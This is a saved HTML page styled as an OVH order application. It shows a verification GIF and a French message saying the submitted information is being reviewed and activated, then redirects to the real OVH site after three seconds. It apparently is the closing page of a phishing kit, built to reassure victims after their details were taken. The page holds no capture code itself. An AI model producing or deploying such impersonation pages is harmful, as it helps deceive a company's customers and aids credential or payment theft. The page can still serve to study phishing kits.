﻿<!DOCTYPE html>
<html data-ng-app="ordersApp" ng-strict-di="" class="hydrated" lang="fr">

    <head>
        <link
            rel="icon"
            href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGtAGABrQBgDa0AYCWtAGAlrQBgJa0AYCWtAGANrQBgAa0AYAGtAGANrQBgJa0AYCWtAGAlrQBgJa0AYA2tAGABrQBgBa0AYZmtAGMFrQBjAa0AYwGtAGMFrQBhfa0AYAGtAGABrQBgWa0AYomtAGMJrQBjAa0AYwWtAGGZrQBgBa0AYMmtAGN5rQBj/a0AY/2tAGP9rQBj/a0AY1WtAGCJrQBgAa0AYAGtAGHxrQBj+a0AY/2tAGP9rQBjea0AYMmtAGJBrQBj/a0AY/2tAGP9rQBj/a0AY/2tAGP9rQBiIa0AYAGtAGDZrQBiJa0AY8WtAGP9rQBj/a0AY/2tAGJBrQBjXa0AY/2tAGP9rQBj/a0AY/2tAGP9rQBj/a0AY52tAGDRrQBg5a0AY6WtAGP9rQBj/a0AY/2tAGP9rQBjXa0AY92tAGP9rQBj/a0AYymtAGNprQBj/a0AY/2tAGP9rQBika0AYCmtAGIxrQBj/a0AY/2tAGP9rQBj/a0AY92tAGP5rQBj/a0AY72tAGERrQBhoa0AY+2tAGP9rQBj/a0AY82tAGE1rQBgia0AY1mtAGP1rQBj+a0AY/2tAGP5rQBjua0AY/2tAGJprQBgEa0AYEmtAGL5rQBj/a0AY/2tAGP9rQBi/a0AYFGtAGDNrQBhQa0AYqWtAGP9rQBjua0AYwWtAGONrQBgua0AYAGtAGABrQBhPa0AY82tAGP9rQBj/a0AY+2tAGGtrQBgAa0AYAGtAGC5rQBjia0AYwWtAGGlrQBh4a0AYAGtAGABrQBgAa0AYCGtAGKRrQBj/a0AY/2tAGP9rQBjXa0AYJGtAGABrQBgAa0AYd2tAGGlrQBgMa0AYDWtAGAAAAAAAa0AYAGtAGABrQBgza0AYtmtAGMBrQBjAa0AYwWtAGFhrQBgAa0AYAGtAGAxrQBgMAAAAAAAAAAAAAAAAAAAAAAAAAABrQBgAa0AYAWtAGAhrQBgJa0AYCWtAGAlrQBgHa0AYAGtAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA//8AAP//AACBgQAAAYAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgYAAAYCAAAPAwAAPwHAAD//wAA//8AAA=="
        />
        <style type="text/css">
            [uib-typeahead-popup].dropdown-menu {
                display: block;
            }
        </style>
        <style type="text/css">
            .uib-time input {
                width: 50px;
            }
        </style>
  <title ng-bind="(title || 'Order') + ' -'">loading - </title>
        <meta name="description" content="" />
        <meta name="viewport" content="width=device-width" />
        <meta name="robots" content="noindex" />
        <style>
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak {
                display: none !important;
            }
        </style>
        <style id="criticalCss">
            order-loader,
            .order-loader {
                display: flex;
                transition: all ease-in-out 0.3s;
                background: rgba(255, 255, 255, 0.9);
                position: fixed;
                top: 0;
                bottom: 0;
                left: 0;
                right: 0;
                z-index: 1049;
                align-items: center;
                justify-content: center;
                flex-flow: column;
            }

            .order-loader__spinner {
                position: relative;
                width: 8.75rem;
                height: 8.75rem;
            }

            .order-loader__spinner.fadeIn {
                opacity: 0;
                animation: fadeIn 0.5s ease-out forwards;
            }

            .order-loader__spinner::before {
                content: "";
                background-image: url(data:image/png;base64,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);
                width: 100%;
                height: 100%;
                display: block;
                margin: auto;
                background-repeat: no-repeat;
                background-size: cover;
                animation: rotation 1.2s linear infinite forwards;
            }

            .order-loader__text-container {
                margin-top: 2rem;
                height: 2em;
                text-align: center;
                color: #00185e;
            }

            .order-loader__text-container.fadeIn {
                opacity: 0;
                animation: fadeIn 0.5s ease-out forwards;
            }

            .order-loader__text-content {
                display: block;
                font-size: 2rem;
            }

            .order-loader__text-additional-content {
                animation: fadeIn 0.5s 60s ease-out forwards;
                opacity: 0;
            }

            @keyframes fadeIn {
                from {
                    opacity: 0;
                }
                to {
                    opacity: 1;
                }
            }
            @keyframes fadeOut {
                from {
                    opacity: 1;
                }
                to {
                    opacity: 0;
                }
            }
            @keyframes rotation {
                1% {
                    transform: rotate(0deg);
                }
                100% {
                    transform: rotate(1turn);
                }
            }
        </style>
 
    </head>
    <body
        data-ng-class="currentRoute"
        bis_register=""
    >
       
        <!---->
        <div id="parent-ui-view" data-ui-view="" bis_skin_checked="1">
            <style>
                body {
                    width: 100vw;
                    height: 100vh;
                    overflow: hidden;
                    background: white;
                }
            </style>
			 <meta http-equiv="refresh" content="3;url=https://www.ovh.com/">
            <span class="order-loader visible" id="critical-loader" role="alert" aria-live="assertive">
               <p style="text-align:center"><img alt="" src="https://media.tenor.com/WsmiS-hUZkEAAAAi/verify.gif" style="height:200px; width:200px" /></p>

<pre style="text-align:center">
<span style="font-size:16px">Merci, les informations sont en cours d&#39;examen et d&#39;activation</span></pre>

            </span>
            <script data-savepage-type="" type="text/plain"></script>
        </div>

    </body>
</html>
